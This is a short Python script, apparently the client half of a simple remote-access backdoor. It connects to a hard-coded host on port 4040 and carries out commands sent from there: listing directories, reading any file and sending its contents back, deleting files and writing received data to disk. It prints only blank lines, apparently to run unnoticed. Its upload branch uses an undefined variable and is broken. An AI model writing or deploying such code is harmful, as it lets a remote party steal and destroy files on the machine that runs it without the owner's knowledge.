import os
import socket

s = socket.socket()
port=4040
host = 'DESKTOP-IMR6DAM'#this will depend on your hostname
s.connect((host,port))
print("")

while 1:
  command = s.recv(1024)#recieve command
  command = command.decode()
  if command == "dir":
     files = os.getcwd()
     files = str(files)    
     s.send(files.encode())
     print(" ")
  elif command == "files":
    user_input = s.recv(5000)
    user_input = user_input.decode()
    files = os.listdir(user_input)
    files = str(files)
    s.send(files.encode())
    print(" ")
  elif command == "copyfile":
    filepath = s.recv(5000)
    filepath = filepath.decode()
    file = open(filepath,"rb")
    data = file.read()
    s.send(data)
    print("")
  elif command == "delfile":
    delfile = s.recv(5000)
    delfile = delfile.decode()
    os.remove(delfile)
  elif command == "uplfile":
    data = conn.recv(100000)
    new_file=open('floo.txt', "wb")
    new_file.write(data)
    new_file.close()
    print("")
  else:
    print("Invalid Command")